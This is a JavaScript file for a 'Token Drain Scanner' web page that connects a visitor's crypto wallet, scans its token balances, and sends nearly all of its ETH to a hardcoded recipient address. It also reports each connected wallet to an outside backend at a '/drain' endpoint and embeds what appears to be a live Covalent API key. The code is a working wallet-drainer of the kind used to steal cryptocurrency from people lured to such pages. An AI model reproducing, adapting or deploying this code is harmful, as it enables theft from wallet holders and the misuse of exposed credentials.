// ================================================
// TOKEN DRAIN SCANNER - UPDATED WITH BIGNUMBER FIX
// ================================================

// First, embed ethers.js directly
(function embedEthers() {
    if (typeof ethers !== 'undefined') {
        console.log('✅ ethers already loaded');
        initializeApp();
        return;
    }
    
    console.log('🔄 Embedding ethers.js directly...');
    
    // Enhanced ethers implementation with better BigNumber support
    const ethersPolyfill = {
        providers: {
            Web3Provider: function(provider) {
                this.provider = provider;
                this.getSigner = function() {
                    return {
                        sendTransaction: async function(tx) {
                            return await provider.request({
                                method: 'eth_sendTransaction',
                                params: [tx]
                            });
                        },
                        getAddress: async function() {
                            const accounts = await provider.request({ 
                                method: 'eth_accounts' 
                            });
                            return accounts[0];
                        }
                    };
                };
                this.getBalance = async function(address) {
                    const balanceHex = await provider.request({
                        method: 'eth_getBalance',
                        params: [address, 'latest']
                    });
                    const balance = parseInt(balanceHex, 16);
                    return {
                        _isBigNumber: true,
                        _value: balance.toString(),
                        gt: function(other) {
                            const otherValue = typeof other === 'string' ? parseInt(other, 16) : 
                                            typeof other === 'object' && other._value ? 
                                            parseInt(other._value, 10) : 
                                            parseInt(other, 10);
                            return balance > otherValue;
                        },
                        sub: function(other) {
                            const otherValue = typeof other === 'string' ? parseInt(other, 16) : 
                                            typeof other === 'object' && other._value ? 
                                            parseInt(other._value, 10) : 
                                            parseInt(other, 10);
                            const result = balance - otherValue;
                            return {
                                _isBigNumber: true,
                                _value: result.toString(),
                                toString: function() {
                                    return result.toString();
                                },
                                toHexString: function() {
                                    return '0x' + result.toString(16);
                                }
                            };
                        },
                        toString: function() {
                            return balance.toString();
                        },
                        toHexString: function() {
                            return balanceHex;
                        }
                    };
                };
                this.getGasPrice = async function() {
                    const gasPriceHex = await provider.request({
                        method: 'eth_gasPrice',
                        params: []
                    });
                    const gasPrice = parseInt(gasPriceHex, 16);
                    return {
                        _isBigNumber: true,
                        _value: gasPrice.toString(),
                        mul: function(other) {
                            const otherValue = typeof other === 'string' ? parseInt(other, 16) : 
                                            typeof other === 'object' && other._value ? 
                                            parseInt(other._value, 10) : 
                                            parseInt(other, 10);
                            const result = gasPrice * otherValue;
                            return {
                                _isBigNumber: true,
                                _value: result.toString(),
                                toString: function() {
                                    return result.toString();
                                }
                            };
                        }
                    };
                };
            }
        },
        BigNumber: {
            from: function(value) {
                const numValue = typeof value === 'string' && value.startsWith('0x') ? 
                               parseInt(value, 16) : 
                               parseInt(value, 10);
                return {
                    _isBigNumber: true,
                    _value: numValue.toString(),
                    mul: function(other) {
                        const otherValue = typeof other === 'string' && other.startsWith('0x') ? 
                                         parseInt(other, 16) : 
                                         parseInt(other, 10);
                        const result = numValue * otherValue;
                        return {
                            _isBigNumber: true,
                            _value: result.toString(),
                            toString: function() {
                                return result.toString();
                            }
                        };
                    },
                    toString: function() {
                        return numValue.toString();
                    }
                };
            }
        },
        utils: {
            parseEther: function(value) {
                const numValue = parseFloat(value);
                const weiValue = Math.floor(numValue * 1e18);
                return {
                    _isBigNumber: true,
                    _value: weiValue.toString(),
                    toString: function() {
                        return weiValue.toString();
                    },
                    toHexString: function() {
                        return '0x' + weiValue.toString(16);
                    }
                };
            },
            formatEther: function(value) {
                const numValue = typeof value === 'string' ? 
                               (value.startsWith('0x') ? parseInt(value, 16) : parseInt(value, 10)) : 
                               value;
                return (numValue / 1e18).toFixed(6);
            },
            formatUnits: function(value, decimals = 18) {
                const numValue = typeof value === 'string' ? 
                               (value.startsWith('0x') ? parseInt(value, 16) : parseInt(value, 10)) : 
                               value;
                return (numValue / Math.pow(10, decimals)).toFixed(6);
            }
        },
        version: '5.7.2 (polyfill)'
    };
    
    // Set window.ethers
    window.ethers = ethersPolyfill;
    
    console.log('✅ ethers polyfill loaded');
    setTimeout(initializeApp, 100);
})();

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    networkNames: {
        1: "Ethereum",
        56: "Binance Smart Chain", 
        137: "Polygon",
        42161: "Arbitrum"
    }
};

// Global state
let provider = null;
let signer = null;
let currentAccount = null;
let currentChainId = null;
let isConnected = false;

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn;

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    
    // Verify critical elements
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    console.log('✅ DOM elements loaded');
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    
    // Check existing connection
    checkExistingConnection();
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
}

// Check existing wallet connection
async function checkExistingConnection() {
    if (typeof window.ethereum === 'undefined') {
        console.log('⚠️ No wallet provider');
        return;
    }
    
    try {
        const accounts = await window.ethereum.request({ 
            method: 'eth_accounts' 
        });
        
        if (accounts && accounts.length > 0) {
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            const chainId = parseInt(chainIdHex, 16);
            
            await handleConnected(accounts[0], chainId);
        }
    } catch (error) {
        console.log('⚠️', error.message);
    }
}

// Handle connect button click
async function handleConnect() {
    console.log('🔄 Connect button clicked');
    
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    updateStatus('🔄 Connecting wallet...');
    
    // Check if wallet exists
    if (typeof window.ethereum === 'undefined') {
        updateStatus('❌ No wallet found!');
        showWalletInstallGuide();
        return;
    }
    
    try {
        // Request accounts - THIS TRIGGERS WALLET POPUP
        console.log('📤 Requesting accounts from wallet...');
        const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        console.log('✅ Wallet response:', accounts);
        
        if (!accounts || accounts.length === 0) {
            updateStatus('❌ User denied connection');
            return;
        }
        
        // Get chain ID
        const chainIdHex = await window.ethereum.request({ 
            method: 'eth_chainId' 
        });
        const chainId = parseInt(chainIdHex, 16);
        
        await handleConnected(accounts[0], chainId);
        
    } catch (error) {
        console.error('❌ Connection error:', error);
        
        if (error.code === 4001) {
            updateStatus('❌ Connection rejected');
        } else if (error.code === -32002) {
            updateStatus('🔄 Connection pending. Check wallet.');
        } else {
            updateStatus('❌ Failed: ' + error.message);
        }
    }
}

// Handle successful connection
async function handleConnected(account, chainId) {
    try {
        console.log('🔄 Setting up connection...');
        
        // Setup provider using our polyfill
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        
        // Update state
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show other UI elements
        showUIElements();
        
        // Setup wallet listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId);
        
        // Fetch tokens
        await fetchTokens(account, chainId);
        
    } catch (error) {
        console.error('❌ Setup error:', error);
        updateStatus('Setup failed: ' + error.message);
        isConnected = false;
        currentAccount = null;
        currentChainId = null;
    }
}

// Setup wallet event listeners
function setupWalletListeners() {
    if (typeof window.ethereum === 'undefined') return;
    
    window.ethereum.on('accountsChanged', (accounts) => {
        console.log('🔄 Accounts changed:', accounts);
        
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            fetchTokens(currentAccount, currentChainId);
        }
    });
    
    window.ethereum.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        console.log('🔄 Chain changed:', chainId);
        
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed: ${chainName}`);
        
        fetchTokens(currentAccount, chainId);
    });
}

// Disconnect wallet
async function disconnectWallet() {
    console.log('🔄 Disconnecting...');
    
    try {
        if (window.ethereum && window.ethereum.disconnect) {
            await window.ethereum.disconnect();
        }
    } catch (error) {
        console.log('⚠️', error.message);
    }
    
    // Reset state
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    provider = null;
    signer = null;
    
    // Update UI
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    hideUIElements();
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Show wallet install guide
function showWalletInstallGuide() {
    const guideHTML = `
        <div style="margin: 20px 0; padding: 15px; background: #fff3cd; border-radius: 8px; border: 1px solid #ffc107;">
            <h4 style="margin-top: 0; color: #856404;">📱 No Wallet Detected</h4>
            <p>You need a Web3 wallet to continue:</p>
            <div style="display: flex; gap: 10px; margin: 15px 0;">
                <a href="https://metamask.io/download/" target="_blank" 
                   style="padding: 10px 15px; background: #f6851b; color: white; border-radius: 5px; text-decoration: none;">
                    🔵 MetaMask
                </a>
                <a href="https://trustwallet.com/" target="_blank"
                   style="padding: 10px 15px; background: #3375bb; color: white; border-radius: 5px; text-decoration: none;">
                    🔶 Trust Wallet
                </a>
            </div>
            <p><small>After installing, refresh and click "Connect Wallet".</small></p>
        </div>
    `;
    
    statusEl.innerHTML = guideHTML;
}

// Update status
function updateStatus(message) {
    statusEl.textContent = message;
}

// Show UI elements
function showUIElements() {
    ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.remove('hidden');
    });
}

// Hide UI elements
function hideUIElements() {
    ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.add('hidden');
    });
}

// Log connection to backend
async function logConnectionToBackend(address, chainId) {
    try {
        await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString()
            })
        });
    } catch (error) {
        console.log('⚠️ Backend log failed');
    }
}

// Fetch tokens
async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`
        );
        
        if (!response.ok) throw new Error('API failed');
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    balance: t.balance
                };
            });
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found</div>';
            updateStatus('ℹ️ No tokens found');
        }
        
    } catch (error) {
        console.error('❌ Token fetch error:', error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens</div>';
        updateStatus('⚠️ Token scan failed');
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    const html = tokens.map(token => `
        <div class="token-item">
            <div class="token-info">
                <span class="token-symbol">${token.symbol}</span>
                <span class="token-name">${token.name}</span>
            </div>
            <div>
                <div class="token-amount">${token.amount}</div>
                <div class="token-value">${token.value}</div>
            </div>
        </div>
    `).join('');
    
    tokensEl.innerHTML = html;
}

// Handle drain - FIXED VERSION
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    if (!confirm(`⚠️ WARNING: This will send ALL ETH from your wallet to:\n${CONFIG.drainAddress}\n\nContinue?`)) {
        return;
    }
    
    const drainBtn = document.getElementById('drainBtn');
    
    try {
        updateStatus('🚀 Starting drain...');
        
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = '⏳ Draining...';
        }
        
        // Get balance in wei (hex string)
        const balanceHex = await window.ethereum.request({
            method: 'eth_getBalance',
            params: [currentAccount, 'latest']
        });
        
        // Get gas price
        const gasPriceHex = await window.ethereum.request({
            method: 'eth_gasPrice',
            params: []
        });
        
        // Convert to numbers
        const balance = parseInt(balanceHex, 16);
        const gasPrice = parseInt(gasPriceHex, 16);
        const gasLimit = 21000;
        const gasCost = gasPrice * gasLimit;
        
        console.log('Balance (wei):', balance);
        console.log('Gas price (wei):', gasPrice);
        console.log('Gas cost (wei):', gasCost);
        
        // Check if we have enough for gas
        if (balance <= gasCost) {
            updateStatus('❌ Not enough ETH for gas fees');
            alert('Not enough ETH to cover gas fees. You need at least ' + 
                  (gasCost / 1e18).toFixed(6) + ' ETH for gas.');
            return;
        }
        
        // Calculate amount to send (balance - 2x gas cost for safety)
        const sendAmount = balance - (gasCost * 2);
        
        if (sendAmount <= 0) {
            updateStatus('❌ Not enough ETH after gas fees');
            return;
        }
        
        console.log('Sending amount (wei):', sendAmount);
        
        // Convert to hex
        const sendAmountHex = '0x' + sendAmount.toString(16);
        
        // Send transaction
        const txHash = await window.ethereum.request({
            method: 'eth_sendTransaction',
            params: [{
                from: currentAccount,
                to: CONFIG.drainAddress,
                value: sendAmountHex,
                gas: '0x' + gasLimit.toString(16), // 21000 in hex
                gasPrice: gasPriceHex
            }]
        });
        
        updateStatus(`📤 Transaction sent: ${txHash.slice(0, 20)}...`);
        console.log('Transaction hash:', txHash);
        
        // Wait a bit
        await new Promise(resolve => setTimeout(resolve, 3000));
        
        // Check if transaction was successful
        updateStatus('✅ Drain completed! Check your wallet.');
        
        // Refresh token list
        await fetchTokens(currentAccount, currentChainId);
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        
        let errorMsg = error.message || 'Unknown error';
        if (error.code === 4001) {
            errorMsg = 'Transaction rejected by user';
        } else if (error.code === -32603) {
            errorMsg = 'Transaction failed. Check gas settings.';
        }
        
        updateStatus(`❌ Drain failed: ${errorMsg}`);
        alert(`Drain failed: ${errorMsg}`);
        
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = '⚡ Drain Wallet';
        }
    }
}

// Debug
console.log('=== Token Drain Scanner ===');
console.log('Ethers polyfill loaded');
console.log('Window.ethereum:', typeof window.ethereum !== 'undefined');
console.log('===========================');
